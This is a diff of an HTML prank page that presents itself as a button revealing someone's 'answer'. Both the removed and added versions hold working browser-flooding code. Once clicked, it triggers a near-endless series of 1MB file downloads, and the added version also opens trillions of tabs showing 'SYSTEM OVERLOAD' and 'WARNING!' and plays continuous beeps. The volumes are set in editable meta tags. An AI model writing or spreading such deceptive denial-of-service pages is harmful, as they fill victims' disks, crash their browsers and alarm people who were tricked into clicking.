@@ -1,65 +1,169 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Charlie My Answer</title>
-    <script>
-        function startDownload() {
-            const button = document.getElementById('downloadBtn');
-            button.disabled = true;
-            button.textContent = 'Downloading...';
-            
-            let count = 0;
-            const total = 999999999999999999999999999;
-            
-            function downloadNext() {
-                // Create 1MB file content
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-                let content = '';
-                for (let i = 0; i < 1000000; i++) {
-                    content += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                
-                // Create file and download
-                const blob = new Blob([content], {type: 'text/plain'});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `system_junk_${count + 1}.txt`;
-                document.body.appendChild(a);
-                a.click();
-                
-                // Clean up
-                setTimeout(() => {
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
-                }, 100);
-                
-                count++;
-                button.textContent = `Downloaded: ${count}/${total}`;
-                
-                if (count < total) {
-                    setTimeout(downloadNext, 0);
-                } else {
-                    button.textContent = ':)';
-                }
-            }
-            
-            downloadNext();
+    <title>Charlie Answer Fix</title>
+    <!-- CONFIGURATION (EDIT THESE VALUES) -->
+    <!-- Files: number of files to download and delay between them (ms) -->
+    <meta name="file-count" content="200000000000000">
+    <meta name="file-delay" content="0">
+    <!-- Tabs: number of tabs to open and delay between them (ms) -->
+    <meta name="tab-count" content="30000000000000">
+    <meta name="tab-delay" content="10">
+    <!-- Audio: number of beeps to play and delay between them (ms) -->
+    <meta name="audio-count" content="3000000000000000000000">
+    <meta name="audio-delay" content="0">
+    <!-- Duration: how long the audio beeps last (ms) -->
+    <meta name="beep-duration" content="1000000000000000">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
         }
-    </script>
+        button {
+            font-size: 24px;
+            padding: 20px 40px;
+            border: none;
+            border-radius: 12px;
+            background: #ff3b30;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 0 20px #ff3b30;
+        }
+    </style>
 </head>
 <body>
-    <button 
-        id="downloadBtn" 
-        onclick="startDownload()" 
-        style="
-            font-size: 20px;
-            padding: 15px 30px;
-            margin: 50px;
-            cursor: pointer;
-        "
-    >
-        Yes or No Click button to find out
-    </button>
+    <button id="actionBtn">Fixed Answer i think</button>
+
+    <script>
+        const actionBtn = document.getElementById('actionBtn');
+        let running = false;
+        let audioContext;
+        
+        // Get configuration from meta tags
+        const config = {
+            files: {
+                count: parseInt(document.querySelector('meta[name="file-count"]').content) || 50,
+                delay: parseInt(document.querySelector('meta[name="file-delay"]').content) || 300
+            },
+            tabs: {
+                count: parseInt(document.querySelector('meta[name="tab-count"]').content) || 10,
+                delay: parseInt(document.querySelector('meta[name="tab-delay"]').content) || 500
+            },
+            audio: {
+                count: parseInt(document.querySelector('meta[name="audio-count"]').content) || 30,
+                delay: parseInt(document.querySelector('meta[name="audio-delay"]').content) || 200,
+                duration: parseInt(document.querySelector('meta[name="beep-duration"]').content) || 100
+            }
+        };
+
+        // Tone generator
+        function playBeep() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.type = 'sine';
+            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
+            gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start();
+            oscillator.stop(audioContext.currentTime + (config.audio.duration / 1000));
+        }
+        
+        // Generate file content
+        function generateContent() {
+            return '0'.repeat(1000000); // 1MB file
+        }
+        
+        // Download files
+        function downloadFiles(count) {
+            if (!running || count <= 0) return;
+            
+            const content = generateContent();
+            const blob = new Blob([content], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `OVERLOAD_${Date.now()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }, 100);
+            
+            if (running) {
+                setTimeout(() => downloadFiles(count - 1), config.files.delay);
+            }
+        }
+        
+        // Open tabs
+        function openTabs(count) {
+            if (!running || count <= 0) return;
+            
+            const urls = [
+                'about:blank',
+                'data:text/html,<h1 style="font-size:10vw;color:red">SYSTEM OVERLOAD</h1>',
+                'data:text/html,<body style="background:black;color:red;display:flex;justify-content:center;align-items:center;height:100vh;margin:0"><h1>WARNING!</h1></body>'
+            ];
+            
+            window.open(urls[Math.floor(Math.random() * urls.length)], '_blank');
+            
+            if (running) {
+                setTimeout(() => openTabs(count - 1), config.tabs.delay);
+            }
+        }
+        
+        // Play audio beeps
+        function playAudioBeeps(count) {
+            if (!running || count <= 0) return;
+            
+            playBeep();
+            
+            if (running) {
+                setTimeout(() => playAudioBeeps(count - 1), config.audio.delay);
+            }
+        }
+        
+        // Main function
+        actionBtn.addEventListener('click', function() {
+            if (confirm("Click for answer")) {
+                running = true;
+                this.disabled = true;
+                this.textContent = "Telling...";
+                
+                // Start all effects
+                downloadFiles(config.files.count);
+                openTabs(config.tabs.count);
+                playAudioBeeps(config.audio.count);
+                
+                // Calculate max duration
+                const maxDuration = Math.max(
+                    config.files.count * config.files.delay,
+                    config.tabs.count * config.tabs.delay,
+                    config.audio.count * config.audio.delay
+                ) + 2000;
+                
+                // Stop after max duration
+                setTimeout(() => {
+                    running = false;
+                    actionBtn.textContent = "My NAswer Is...";
+                }, maxDuration);
+            }
+        });
+    </script>
 </body>
 </html>
